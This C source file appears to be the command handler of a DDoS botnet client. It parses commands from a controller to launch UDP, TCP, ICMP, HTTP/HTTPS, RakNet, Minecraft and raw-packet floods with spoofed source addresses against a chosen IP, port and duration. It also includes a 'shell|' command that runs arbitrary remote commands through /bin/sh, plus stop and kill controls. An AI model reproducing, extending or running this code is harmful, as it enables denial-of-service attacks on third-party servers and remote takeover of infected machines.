#define _GNU_SOURCE

#include "headers/parser.h"
#include "headers/attacks.h"
#include <arpa/inet.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static pthread_t atk_tid = 0;
static volatile int atk_active = 0;
static int atk_running = 0;
static flood_args atk_args;
static pthread_mutex_t atk_mutex = PTHREAD_MUTEX_INITIALIZER;

static void stop_attack(void) {
    pthread_mutex_lock(&atk_mutex);
    if (atk_running) {
        atk_active = 0;
        pthread_mutex_unlock(&atk_mutex);
        pthread_join(atk_tid, NULL);
        pthread_mutex_lock(&atk_mutex);
        atk_running = 0;
    }
    pthread_mutex_unlock(&atk_mutex);
}

static void start_attack(void *(*fn)(void *), const flood_args *src) {
    stop_attack();
    pthread_mutex_lock(&atk_mutex);
    atk_args = *src;
    atk_active = 1;
    atk_args.active = &atk_active;
    if (pthread_create(&atk_tid, NULL, fn, &atk_args) == 0) {
        atk_running = 1;
    } else {
        atk_running = 0;
    }
    pthread_mutex_unlock(&atk_mutex);
}

void parser_stop(void) {
    stop_attack();
}

/* line format: method|... (decrypted). ping/stop/kill/shell handled here. */
void handle_line(const char *line, int sock) {
    (void)sock;
    if (strcmp(line, "ping") == 0) {
        send(sock, "pong\n", 5, MSG_NOSIGNAL);
        return;
    }
    if (strcmp(line, "stop") == 0) {
        stop_attack();
        return;
    }
    if (strcmp(line, "kill") == 0) {
        stop_attack();
        _exit(0);
    }
    if (strncmp(line, "shell|", 6) == 0) {
        const char *cmd = line + 6;
        if (!*cmd || strlen(cmd) > 1500) return;
        pid_t pid = fork();
        if (pid == 0) {
            setsid();
            execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
            _exit(0);
        }
        return;
    }
    char tmp[2048];
    strncpy(tmp, line, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    char *save = NULL;
    char *m = strtok_r(tmp, "|", &save);
    if (!m) return;
    flood_args a;
    memset(&a, 0, sizeof(a));
    a.psize = 0;
    a.msg[0] = '\0';

    if (strcmp(m, "udp") == 0 || strcmp(m, "tcp") == 0) {
        char *ip = strtok_r(NULL, "|", &save);
        char *po = strtok_r(NULL, "|", &save);
        char *du = strtok_r(NULL, "|", &save);
        char *ps = strtok_r(NULL, "|", &save);
        char *ms = strtok_r(NULL, "", &save);
        if (!ip || !po || !du) return;
        struct in_addr ia;
        if (inet_pton(AF_INET, ip, &ia) != 1) return;
        int port = atoi(po), dur = atoi(du);
        if (port < 1 || port > 65535 || dur <= 0 || dur > 86400) return;
        strncpy(a.ip, ip, 63);
        a.port = port;
        a.duration = dur;
        if (ps && *ps) {
            int pv = atoi(ps);
            if (pv < 1 || pv > 1500) return;
            a.psize = pv;
        }
        if (ms) strncpy(a.msg, ms, 1023);
        start_attack(strcmp(m, "udp") == 0 ? udp_flood : tcp_flood, &a);
    } else if (strcmp(m, "icmp") == 0) {
        char *ip = strtok_r(NULL, "|", &save);
        char *du = strtok_r(NULL, "|", &save);
        char *ps = strtok_r(NULL, "|", &save);
        char *ms = strtok_r(NULL, "", &save);
        if (!ip || !du) return;
        struct in_addr ia;
        if (inet_pton(AF_INET, ip, &ia) != 1) return;
        int dur = atoi(du);
        if (dur <= 0 || dur > 86400) return;
        strncpy(a.ip, ip, 63);
        a.duration = dur;
        if (ps && *ps) {
            int pv = atoi(ps);
            if (pv < 1 || pv > 1500) return;
            a.psize = pv;
        }
        if (ms) strncpy(a.msg, ms, 1023);
        start_attack(icmp_flood, &a);
    } else if (strcmp(m, "https") == 0) {
        char *ip = strtok_r(NULL, "|", &save);
        char *po = strtok_r(NULL, "|", &save);
        char *du = strtok_r(NULL, "|", &save);
        char *ho = strtok_r(NULL, "|", &save);
        char *pa = strtok_r(NULL, "", &save);
        if (!ip || !po || !du) return;
        struct in_addr ia;
        if (inet_pton(AF_INET, ip, &ia) != 1) return;
        int port = atoi(po), dur = atoi(du);
        if (port < 1 || port > 65535 || dur <= 0 || dur > 86400) return;
        strncpy(a.ip, ip, 63);
        if (ho && *ho) strncpy(a.host, ho, 255);
        a.port = port;
        a.duration = dur;
        if (pa && *pa) {
            if (pa[0] != '/' || strchr(pa, ' ') || strchr(pa, '|')) return;
            strncpy(a.path, pa, 255);
        }
        start_attack(https_flood, &a);
    } else if (strcmp(m, "http") == 0) {
        char *ip = strtok_r(NULL, "|", &save);
        char *po = strtok_r(NULL, "|", &save);
        char *du = strtok_r(NULL, "|", &save);
        char *pa = strtok_r(NULL, "", &save);
        if (!ip || !po || !du) return;
        struct in_addr ia;
        if (inet_pton(AF_INET, ip, &ia) != 1) return;
        int port = atoi(po), dur = atoi(du);
        if (port < 1 || port > 65535 || dur <= 0 || dur > 86400) return;
        strncpy(a.ip, ip, 63);
        a.port = port;
        a.duration = dur;
        if (pa && *pa) {
            if (pa[0] != '/' || strchr(pa, ' ') || strchr(pa, '|')) return;
            strncpy(a.path, pa, 255);
        }
        start_attack(http_flood, &a);
    } else if (strcmp(m, "https-classic") == 0) {
        char *ip = strtok_r(NULL, "|", &save);
        char *po = strtok_r(NULL, "|", &save);
        char *du = strtok_r(NULL, "|", &save);
        char *ho = strtok_r(NULL, "|", &save);
        char *pa = strtok_r(NULL, "", &save);
        if (!ip || !po || !du) return;
        struct in_addr ia;
        if (inet_pton(AF_INET, ip, &ia) != 1) return;
        int port = atoi(po), dur = atoi(du);
        if (port < 1 || port > 65535 || dur <= 0 || dur > 86400) return;
        strncpy(a.ip, ip, 63);
        if (ho && *ho) strncpy(a.host, ho, 255);
        a.port = port;
        a.duration = dur;
        if (pa && *pa) {
            if (pa[0] != '/' || strchr(pa, ' ') || strchr(pa, '|')) return;
            strncpy(a.path, pa, 255);
        }
        start_attack(https_classic_flood, &a);
    } else if (strcmp(m, "raknet") == 0) {
        char *ip = strtok_r(NULL, "|", &save);
        char *po = strtok_r(NULL, "|", &save);
        char *du = strtok_r(NULL, "|", &save);
        if (!ip || !po || !du) return;
        struct in_addr ia;
        if (inet_pton(AF_INET, ip, &ia) != 1) return;
        int port = atoi(po), dur = atoi(du);
        if (port < 1 || port > 65535 || dur <= 0 || dur > 86400) return;
        strncpy(a.ip, ip, 63);
        a.port = port;
        a.duration = dur;
        start_attack(raknet_flood, &a);
    } else if (strcmp(m, "minecraft") == 0) {
        char *ip = strtok_r(NULL, "|", &save);
        char *po = strtok_r(NULL, "|", &save);
        char *du = strtok_r(NULL, "|", &save);
        if (!ip || !po || !du) return;
        struct in_addr ia;
        if (inet_pton(AF_INET, ip, &ia) != 1) return;
        int port = atoi(po), dur = atoi(du);
        if (port < 1 || port > 65535 || dur <= 0 || dur > 86400) return;
        strncpy(a.ip, ip, 63);
        a.port = port;
        a.duration = dur;
        start_attack(minecraft_flood, &a);
    } else if (strcmp(m, "tcpraw") == 0) {
        char *ip = strtok_r(NULL, "|", &save);
        char *po = strtok_r(NULL, "|", &save);
        char *du = strtok_r(NULL, "|", &save);
        char *tf = strtok_r(NULL, "|", &save);
        char *sp = strtok_r(NULL, "|", &save);
        char *so = strtok_r(NULL, "|", &save);
        char *ps = strtok_r(NULL, "|", &save);
        char *ms = strtok_r(NULL, "", &save);
        if (!ip || !po || !du) return;
        struct in_addr ia;
        if (inet_pton(AF_INET, ip, &ia) != 1) return;
        int port = atoi(po), dur = atoi(du);
        if (port < 1 || port > 65535 || dur <= 0 || dur > 86400) return;
        strncpy(a.ip, ip, 63);
        a.port = port;
        a.duration = dur;
        if (tf && *tf) {
            char *end = NULL;
            long v = strtol(tf, &end, 0);
            if (end == tf || *end != '\0' || v < 0 || v > 0xff) return;
            a.tcpflags = (int)v;
        } else {
            a.tcpflags = 0x02;
        }
        if (sp && *sp) {
            int sport = atoi(sp);
            if (sport < 0 || sport > 65535) return;
            a.srcport = sport;
        }
        if (so && *so) strncpy(a.spoof, so, 511);
        if (ps && *ps) {
            int pv = atoi(ps);
            if (pv < 1 || pv > 1500) return;
            a.psize = pv;
        }
        if (ms) strncpy(a.msg, ms, 1023);
        start_attack(tcpraw_flood, &a);
    } else if (strcmp(m, "udpraw") == 0) {
        char *ip = strtok_r(NULL, "|", &save);
        char *po = strtok_r(NULL, "|", &save);
        char *du = strtok_r(NULL, "|", &save);
        char *sp = strtok_r(NULL, "|", &save);
        char *so = strtok_r(NULL, "|", &save);
        char *ps = strtok_r(NULL, "|", &save);
        char *ms = strtok_r(NULL, "", &save);
        if (!ip || !po || !du) return;
        struct in_addr ia;
        if (inet_pton(AF_INET, ip, &ia) != 1) return;
        int port = atoi(po), dur = atoi(du);
        if (port < 1 || port > 65535 || dur <= 0 || dur > 86400) return;
        strncpy(a.ip, ip, 63);
        a.port = port;
        a.duration = dur;
        if (sp && *sp) {
            int sport = atoi(sp);
            if (sport < 0 || sport > 65535) return;
            a.srcport = sport;
        }
        if (so && *so) strncpy(a.spoof, so, 511);
        if (ps && *ps) {
            int pv = atoi(ps);
            if (pv < 1 || pv > 1500) return;
            a.psize = pv;
        }
        if (ms) strncpy(a.msg, ms, 1023);
        start_attack(udpraw_flood, &a);
    }
}
